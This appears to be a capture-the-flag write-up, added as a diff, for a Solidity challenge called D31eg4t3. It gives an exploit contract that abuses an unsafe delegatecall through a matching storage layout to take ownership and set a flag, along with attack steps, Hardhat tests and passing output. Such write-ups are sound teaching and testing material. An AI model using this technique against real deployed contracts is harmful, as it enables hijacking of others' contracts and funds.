@@ -1,0 +1,94 @@
+The exploit smart contract:
+
+// Put the D31eg4t3 contract here to run in remix.
+contract ExploitD31eg4t3{
+
+    uint a = 12345;
+    uint8 b = 32;
+    string private d; // Super Secret data.
+    uint32 private c; // Super Secret data.
+    string private mot; // Super Secret data.
+    address public owner;
+    mapping (address => bool) public canYouHackMe;
+
+    D31eg4t3 public target;
+
+    constructor(address _targetAddress){
+        target = D31eg4t3(_targetAddress);
+    }
+
+    function hackContract(address _hackerAddress) public {
+        // Objective 1
+        owner = _hackerAddress;
+        // Objective 2
+        canYouHackMe[_hackerAddress] = true;
+    }
+
+    function attack() external{
+        (bool success,bytes memory data) = target.hackMe(abi.encodeWithSignature("hackContract(address)",msg.sender));
+        require(success,"Failed!!!");
+    }
+}
+
+Vulnerability:
+The delegatecall() is tricky to use and wrong usage or incorrect understanding can lead to devastating results. This contract uses delegatecall() in an unsafe way, which can be exploited.
+
+Objectives:
+1. Become the owner of the contract.
+2. Make canYouHackMe mapping to true for your own address.
+
+Attack steps:
+1. 2 things to keep in mind when using delegatecall
+        - delegatecall preserves context (storage, caller, etc...)
+        - storage layout must be the same for the contract calling delegatecall and the contract getting called
+2. The storage layout should be the same for the exploit to work. So, all the variables should be in 
+same order and any new variables should be below them.
+3. The exploiter will call the attack() function, which will call the hackMe() function of the D31eg4t3
+contract passing the encoded abi for hackContract() function.
+4. The hackContact() function does the updation of owner variable and canYouHackMe mapping.
+5. This will work because the hackContact() function will be executed in context of the D31eg4t3
+contract, so the updation will change the storage variables in the D31eg4t3 contract rather than the
+ExploitD31eg4t3 contract. Which will in turn achieve our objectives.
+
+Test cases for this:
+
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+describe("Exploit D31eg4t3 Contract", function () {
+    before(async () => {
+        // deploying the target contract
+        const D31eg4t3 = await ethers.getContractFactory("D31eg4t3");
+        target = await D31eg4t3.deploy();
+        accounts = await ethers.getSigners();
+        [owner, exploiter] = accounts;
+    })
+    it("Deploy the exploit contract", async () => {
+        const Exploit = await ethers.getContractFactory("ExploitD31eg4t3");
+        exploit_contract = await Exploit.connect(exploiter).deploy(target.address);
+        expect(exploit_contract.address).to.not.equal(ethers.constants.AddressZero);
+    })
+    it("Exploiter calls the attack() function and takes control of the contract", async () => {
+        const oldOwner = await target.owner();
+        expect(oldOwner).to.equal(owner.address)
+        await exploit_contract.connect(exploiter).attack();
+        const newOwner = await target.owner();
+        expect(newOwner).to.equal(exploiter.address)
+    })
+    it("Make sure the canYouHackMe mapping is updated", async () => {
+        const canYouHackMeOutput = await target.canYouHackMe(exploiter.address);
+        expect(canYouHackMeOutput).to.equal(true);
+    })
+});
+
+Output for these test cases:
+❯ npx hardhat test test/D31eg4t3CTF.test.js
+
+
+  Exploit D31eg4t3 Contract
+    ✔ Deploy the exploit contract
+    ✔ Exploiter calls the attack() function and takes control of the contract
+    ✔ Make sure the canYouHackMe mapping is updated
+
+
+  3 passing (786ms)
